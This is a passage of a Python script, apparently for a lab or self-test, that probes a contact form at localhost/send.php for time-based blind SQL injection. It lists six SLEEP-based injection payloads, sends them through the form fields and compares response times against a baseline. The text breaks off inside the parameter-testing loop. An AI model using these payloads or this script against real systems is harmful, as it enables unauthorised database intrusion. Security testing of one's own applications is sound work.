import requests
import time
from urllib.parse import urlencode

# Configuration
target_url = "http://localhost/send.php"
parameters = ['fullname', 'email', 'phone', 'subject', 'message']
sleep_payloads = [
    "' OR SLEEP(5)-- ",
    "'; SLEEP(5);-- ",
    "') OR SLEEP(5);-- ",
    "' OR (SELECT SLEEP(5))--",
    "' UNION SELECT SLEEP(5)--",
    "'||(SELECT SLEEP(5))--",
]

# Valid data values for other parameters when testing one
valid_data = {
    'fullname': 'John Doe',
    'email': 'john@example.com',
    'phone': '555-1234',
    'subject': 'Test Inquiry',
    'message': 'This is a test message'
}

def measure_request_time(payload_data):
    """Send request and return response time"""
    start_time = time.time()
    try:
        response = requests.post(
            target_url,
            data=payload_data,
            allow_redirects=False,
            timeout=30  # Max wait time
        )
        end_time = time.time()
        return end_time - start_time, response.status_code
    except Exception as e:
        end_time = time.time()
        return end_time - start_time, f"ERROR: {str(e)}"

# Step 1: Establish baseline timing
print("=" * 60)
print("BLIND SQL INJECTION TEST - TIME-BASED")
print("=" * 60)
print(f"Target: {target_url}")
print("Testing parameters:", parameters)
print()

print("[*] Establishing baseline response time...")
baseline_times = []
for i in range(3):
    response_time, status = measure_request_time(valid_data)
    baseline_times.append(response_time)
    print(f"  Baseline request {i+1}: {response_time:.3f}s (Status: {status})")

average_baseline = sum(baseline_times) / len(baseline_times)
print(f"[*] Average baseline time: {average_baseline:.3f}s")
print()

# Step 2 & 3: Test each parameter with sleep payloads
print("[*] Testing parameters with sleep injection payloads...")
print()

vulnerable_parameters = []

for param in parameters:
    print(f"\n[TESTING PARAMETER: {param}]")
    print("-" * 50)
    param_vulnerable = False
    
